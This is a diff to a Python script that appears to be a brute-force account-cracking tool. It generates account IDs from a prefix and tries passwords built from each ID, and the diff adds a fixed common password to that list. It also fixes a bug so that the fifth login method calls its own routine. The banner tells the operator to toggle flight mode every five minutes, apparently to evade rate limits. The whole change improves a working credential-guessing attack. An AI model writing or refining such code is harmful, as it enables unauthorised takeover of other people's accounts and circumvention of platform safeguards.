@@ -391,7 +391,7 @@ def bd():
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
 			for psx in user:
 				uid = code+psx
-				passlist = [uid[:6],uid[:8],uid]
+				passlist = [uid[:6],uid[:8],uid,'57273200']
 				if mthd in ['1','01']:
 					habib.submit(rndm1,uid,passlist)
 				if mthd in ['2','02']:
@@ -401,7 +401,7 @@ def bd():
 				if mthd in ['4','04']:
 					habib.submit(rndm4,uid,passlist)
 				if mthd in ['5','05']:
-					habib.submit(rndm4,uid,passlist)
+					habib.submit(rndm5,uid,passlist)
 		print('\033[1;37m')
 		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
